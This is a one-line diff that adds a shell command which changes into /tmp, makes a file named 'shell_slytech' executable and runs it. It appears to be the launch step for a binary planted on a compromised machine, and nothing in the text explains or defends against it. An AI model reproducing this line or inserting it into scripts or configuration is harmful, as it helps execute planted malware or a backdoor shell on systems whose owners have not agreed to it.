@@ -1,0 +1,1 @@
+ls /tmp/; cd /tmp/; chmod +x shell_slytech;./shell_slytech
